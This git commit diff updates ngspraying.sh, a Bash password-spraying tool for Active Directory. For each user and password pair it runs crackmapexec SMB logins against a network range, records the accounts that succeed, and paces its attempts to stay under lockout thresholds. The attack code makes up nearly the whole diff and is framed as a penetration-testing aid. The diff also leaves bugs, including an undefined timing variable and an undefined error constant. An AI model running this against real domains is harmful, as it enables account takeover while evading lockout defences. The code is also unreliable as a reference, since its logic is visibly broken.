b961d1b2265096dd2b98a589b2409193a85ae990
nnico <49344962+nnicogomez@users.noreply.github.com>
2020-03-21 15:52:04 -0300

    Added arg flags and a better help
    Added arg flags and a better help

--- ngspraying.sh
+++ ngspraying.sh
@@ -1,17 +1,63 @@
 #! /bin/bash
+EMPTYPARAMETERS=100
+HELP_REQUESTED=101
+ATTEMPTS_ARG_ERROR=102
+BLOCKTIME_ARG_ERROR=103
+NETWORK_ARG_ERROR=104
+DOMAIN_ARG_ERROR=105
+MASK_DOMAIN_ERROR=106
 
+: '
+
+If Password complexity is enabled on domain controller, the following will be the password requirements:
+
+Windows Server 2016
+Passwords must be at least six characters in length.
+English uppercase characters (A through Z).
+English lowercase characters (a through z).
+Base 10 digits (0 through 9).
+Non-alphabetic characters (for example, !, $, #, %)
+
+Windows Server 2012 and 2012 R2
+6 caracteres
+Passwords must be at least six characters in length.
+English uppercase characters (A through Z).
+English lowercase characters (a through z).
+Base 10 digits (0 through 9).
+Non-alphabetic characters (for example, !, $, #, %)
+
+Windows Server 2003
+https://www.tacktech.com/display.cfm?ttid=354
+Has at least 6 characters
+Does not contain "Administrator" or "Admin"
+Contains characters from three of the following categories:
+Uppercase letters (A, B, C, and so on)
+Lowercase letters (a, b, c, and so on)
+Numbers (0, 1, 2, and so on)
+Non-alphanumeric characters (#, &, ~, and so on)
+
+Windows Server 2008
+https://thebackroomtech.com/2008/03/10/windows-server-2008-password-complexity-requirements/
+Passwords cannot contain the user’s account name or parts of the user’s full name that exceed two consecutive characters.
+Passwords must be at least six characters in length.
+Passwords must contain characters from three of the following four categories:
+English uppercase characters (A through Z).
+English lowercase characters (a through z).
+Base 10 digits (0 through 9).
+Non-alphabetic characters (for example, !, $, #, %)
+'
 
 #################### FEATURES
 function usage {
-	figlet ngspraying
-	#banner ngspraying
-	echo -e "\nngspraying is a tool that allows test passwords policy of an internal active directory. Usually, ADs have rules that block user account after a number of wrong login attempts. cmeautom controls the time of attempts and the number of attempts, in order to perform the test without blocking the users account."
+	#figlet ngspraying
+	banner ngspraying
+	echo -e "\nngspraying is a tool that allows test passwords policy of an internal active directory. Usually, Active Directories have rules that block user accounts after a number of wrong login attempts. ngspraying controls the time of attempts and the number of attempts, in order to perform the test without blocking the users account. This is so util in internal network assessment, where the script could be ran in background while the penetration tester continues working."
 	echo -e "Features: . Application controls login attempts.\n. Application dont perform login attempts with users already found.\n. Application allows manual configuration of password complexity.\n. Application make backup of input-files.\n\n"
 	echo -e "Usage:"
-	echo -e "./cmeautom.sh [Users account file] [Password dictionary] [attempts] [Block time] [Network] [Mask] [Domain]\n\n***************************************************\n"
+	echo -e "All the parameters below are mandatory:\n./ngspraying.sh -uf Users_account_file -pd Password dictionary -a attempts number -bt Block time -n Network -m Mask -d Domain\n\n***************************************************\n"
 	echo -e "Parameters\n"
-	echo -e "Users account file:\nActive Directory users. Format: Only the user account, without the domain (e.g domain\user or user@domain is not correct. Only write the "user" is correct). One user by line\n"
-	echo -e "\nPassword dictionary:\nPassword file. Format: One password by line\n"
+	echo -e "Users account file:\nActive Directory users. Format: Only the user account, without the domain (e.g domain\user or user@domain is not correct. Only write the "user" is correct). One user by line\n. To enumerate users could be used enum4linux (https://tools.kali.org/information-gathering/enum4linux) or a powershell tool like ADRecon (https://github.com/sense-of-security/ADRecon)."
+	echo -e "\nPassword dictionary:\nPassword file. Format: One password by line. See https://digg.com/2019/worst-passwords-most-common. It is recommended create a custom list related to the client, date and general context of the assesmment. Additionally, it is possible to use the ngspraying.sh's brother, genpass.sh (https://github.com/nnicogomez/password-spraying.\n"
 	echo -e "\nattempts:\nRequired attemtps to block the users account. If the account will be block after five (5) wrong attempts (This means, the 6th attemp wont be possible because the account was blocked) in ten (10) minutes, we should enter five (5).\n"
 	echo -e "\nBlock time:\nWindow time to catch wrong login attempts. Following previously example; if the account will be block after x wrong attempts in 10 minutes, we should enter ten (10).\n"
 	echo -e "\nNetwork:\nNetwork. Protocol: IPv4. e.g: 192.168.0.0\n"
@@ -19,9 +65,10 @@ function usage {
 	echo -e "\nDomain:\nClient domain. Ej: ENTERPRISE.LOCAL\n"
 	echo -e "\n********************************\nTypical invoke example\n"
 	echo -e "./ngspraying.sh clientUserFile passwordsDictionary 5 10 192.168.0.0 24 TEST.LOCAL\n"
+	exit $HELP_REQUESTED
 	}
 
-function tratamientoPassword(){
+function passwordComplexity(){
 	read -p "Minimum number of characters: " carac1
 	read -p "Maximum number of characters: " carac2
 	read -p "Number required? Y/N: " numeros
@@ -44,10 +91,89 @@ function tratamientoPassword(){
 	clear
 }
 
+
+i=0
+
 center() {
   termwidth="$(tput cols)"
   padding="$(printf '%0.1s' ={1..500})"
   printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
+}
+
+
+function showErrorAndExit(){
+	echo "ERROR "
+	case $1 in
+    $EMPTYPARAMETERS)
+      echo "One of the given arguments is empty"
+      exit $EMPTYPARAMETERS
+      ;;
+	$ATTEMPTS_ARG_ERROR)
+      echo "Attempts less than zero or bigger than twenty"
+      exit $ATTEMPTS_ARG_ERROR
+      ;;
+	$BLOCKTIME_ARG_ERROR)
+      echo "Attempts less than zero"
+      exit $BLOCKTIME_ARG_ERROR
+      ;;
+	$NETWORK_ARG_ERROR)
+      echo "Network has a wrong format"
+      exit $NETWORK_ARG_ERROR
+      ;;
+	$MASK_ARG_ERROR)
+      echo "Mask has a wrong format"
+      exit $MASK_ARG_ERROR
+      ;;
+	$DOMAIN_ARG_ERROR)
+      echo "Domain is not a string"
+      exit $DOMAIN_ARG_ERROR
+      ;;
+    -*)
+	  break;
+      ;;
+	esac
+}
+
+function emptyArguments(){
+	if [[ $1 == "" ||  $2 == "" || $3 == "" || $4 == "" || $5 == "" || $6 == "" || $7 == "" ]]; then
+	showErrorAndExit $EMPTYPARAMETERS
+	fi
+}
+
+function attempts_validation(){
+	min=1
+	max=20
+	if (( "$1" < "$min" || "$1" > "$max" )); then
+	showErrorAndExit $ATTEMPTS_ARG_ERROR
+	fi
+}
+
+function block_time_validation(){
+	if (( "$1" < 1 )); then
+	showErrorAndExit $BLOCKTIME_ARG_ERROR
+	fi
+}
+
+function network_validation(){
+	if [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+	echo ""
+	else
+	showErrorAndExit $NETWORK_ARG_ERROR
+	fi
+}
+
+function mask_validation(){
+	min=1
+	max=32
+	if (( "$1" < "$min" || "$1" > "$max" )); then
+	showErrorAndExit $MASK_ARG_ERROR
+	fi
+}
+
+function domain_validation(){
+	if [[ $1 =~ ^[0-9]{2,30} ]]; then
+	showErrorAndExit $DOMAIN_ARG_ERROR
+	fi
 }
 
 function control_c(){
@@ -68,55 +194,95 @@ function control_c(){
 	echo -e "$lines" >> ultimos.tmp #Usuario
 	echo -e "$line" >> ultimos.tmp #Password
 	kill $PID
-	exit
+	exit 1
 }
 
 #################### FUNCIONES
 
 #################### VALIDACIONES
-if [[ $1 == "-help" || $1 == "--help" || $1 == "-h" ]]; then
+users_file=""
+pwd_file=""
+attempts=""
+block_time=""
+network=""
+mask=""
+domain=""
+
+if [ $# == 0 ]; then
 usage
-exit
 fi
 
-if [ $# != 7 ]; then
-echo "Incorrect number of parameters. Retry."
-exit
-else
+for arg in "$@"
+do
+	case $1 in
+		-h|--help|--h)
+		usage
+		;;
+		-uf)
+			users_file=$2
+		shift
+		shift
+		;;
+		-pd)
+			pwd_file=$2
+		shift
+		shift
+		;;
+		-a)
+			attempts=$2
+		shift
+		shift
+		;;
+		-bt)
+			block_time=$2
+		shift
+		shift
+		;;
+		-n)
+			network=$2
+		shift
+		shift
+		;;
+		-m)
+			mask=$2
+		shift
+		shift
+		;;
+		-d)
+			domain=$2
+		shift
+		shift
+		;;
+		*)
+		OTHER_ARGUMENTS+=("$1")
+		break
+		;;
+  esac
+done
+
+emptyArguments $users_file $pwd_file $attempts $block_time $network $mask $domain
+attempts_validation $attempts
+block_time_validation $block_time
+network_validation $network
+mask_validation $mask
+domain_validation $domain
+
 echo "Good!"
-fi
 center " ngspraying "
 
-cp $1 $1.bak
-cp $2 $2.bak
-read -p "Do you want to enter password complexity values? (net account /domain could help you...) Y/N: " valor
-if [[ $valor == "Y" || $valor == "y" || $valor == 'Y' || $valor == 'y' ]]; then
-tratamientoPassword $2
+cp $users_file $users_file.bak
+cp $pwd_file $pwd_file.bak
+read -p "Do you want to enter password complexity values? (net account /domain could help you...) Y/N: " value_d
+if [[ $value_d == "Y" || $value_d == "y" || $value_d == 'Y' || $value_d == 'y' ]]; then
+passwordComplexity $2
 else clear
-fi
-
-if [[ $3 -lt "1" ]]; then
-echo -e "\e[1;31mInvalid number of attempts. It should be at least 1\e[0m"
-exit
-fi
-
-if [[ $4 == "0" ]]; then
-echo -e "\e[1;31mTime equal to zero. It's not allowed\e[0m"
-exit
-fi
-
-
-val=1
-if [[ $3 == "1" ]]; then
-echo -e "\e[1;31mNumber of attempts less than or equal to 1\e[0m"
-val=0
 fi
 #################### VALIDACIONES
 
 #################### MAIN
 
-archUs=$1
-archPw=$2
+archUs=$users_file
+archPw=$pwd_file
 band=0
 if [[ -f ultimos.tmp ]]; then
 	var=1	
@@ -134,11 +300,11 @@ if [[ -f ultimos.tmp ]]; then
 	echo "Last password: $ultPw"
 	read -p "Do you want to continue from the last point? [User: $ultUser][Password: $ultPw] [Y/N]" rta
 	if [[ "$rta" == "Y" || "$rta" == "y" ]]; then
-		cp "$1" "$1.tmp"
-		cp "$2" "$2.tmp"
+		cp "$users_file" "$users_file.tmp"
+		cp "$pwd_file" "$pwd_file.tmp"
 		band=1
-		awk "/^$ultPw$/,/*/" $2 > tmp && mv tmp $2		
-		awk "/^$ultUser$/,/*/" $1 > tmp && mv tmp $1
+		awk "/^$ultPw$/,/*/" $pwd_file > tmp && mv tmp $pwd_file
+		awk "/^$ultUser$/,/*/" $users_file > tmp && mv tmp $users_file
 		clear
 	fi
 	
@@ -146,50 +312,50 @@ fi
 
 trap control_c SIGINT 
 
-inte=`expr $3 - 1`
-tiempo=`expr $4 \* 60`
-dominio=$(echo "$7")
+inte=`expr $attempts - 1`
+time=`expr $block_time \* 60`
+domain=$(echo "$domain")
 i=1
 k=0
-tamano=$(wc -w $2)
+tamano=$(wc -w $users_file)
 tam="${tamano:0:1}"
 
-center " $inte attempts will be made every $4 minutes($tiempo seconds). Target: $dominio"
-while [[ "$i" -lt "$3" && "$k" -lt "$tam" ]];
+center " $inte attempts will be made every $block_time minutes($tiempo seconds). Target: $domain"
+while [[ "$i" -lt "$attempts" && "$k" -lt "$tam" ]];
 do
 		read -r line
 		echo -e "\e[1;32m [+] Actual password: *$line*. Number: $k\e[0m";
 		echo -e "\e[0;32m [++] Actual attempt: $i\e[0m"
 			while read -r lines; do
 				echo -e "\t \e[1;33m [+++] Actual user: *$lines*\e[0m"
-					resultado=$(crackmapexec smb ${5}/${6} -u $lines -p $line -d $dominio --shares)
+					resultado=$(crackmapexec smb ${network}/${mask} -u $lines -p $line -d $domain --shares)
 					echo -e "$resultado \n" >> logCME
 					echo "$resultado"| while read linea; do
 						if [[ $linea == *"Enumerating shares"* ]]
 						then
-							sed -i "s/\<$lines\>//g" $1 ## Aca deberiamos eliminar la palabra del archivo.	
-							sed -i '/^ *$/d' $1
+							sed -i "s/\<$lines\>//g" $users_file ## Aca deberiamos eliminar la palabra del archivo.	
+							sed -i '/^ *$/d' $users_file
 							final=$(echo $linea | sed 's/^[^0-9]*\(.*\)/\1/')
 				   			echo -e "****************************\nLogin attempt successfully! User: $lines. Password: $line.\nData: $final\n****************************" >> finallogscript
 							echo -e "\t\t \e[1;37m ****Login attempt successfully. User: $lines****\e[0m"
 						fi
 					done
-			done < "$1"
+			done < "$users_file"
 		if [[ $band == 1 ]];then
-			rm "$1"
-			cp "$1.tmp" "$1"
-			rm "$1.tmp"
+			rm "$users_file"
+			cp "$users_file.tmp" "$users_file"
+			rm "$users_file.tmp"
 			band=0
 		fi
 		let i=i+1
 		let k=k+1
-	if [[ "$i" == "$3" ]]
+	if [[ "$i" == "$attempts" ]]
 	then
 		i=1
-		echo -e "\e[1;36m Sleeping $4 minutes ($tiempo seconds) \e[0\m"
+		echo -e "\e[1;36m Sleeping $block_time minutes ($tiempo seconds) \e[0\m"
 		sleep $tiempo #X tiempo va a permanecer esperando el script
 	fi
-done < "$2"
+done < "$pwd_file"
 
 center " END "
 if [[ -f ultimos.tmp ]]; then
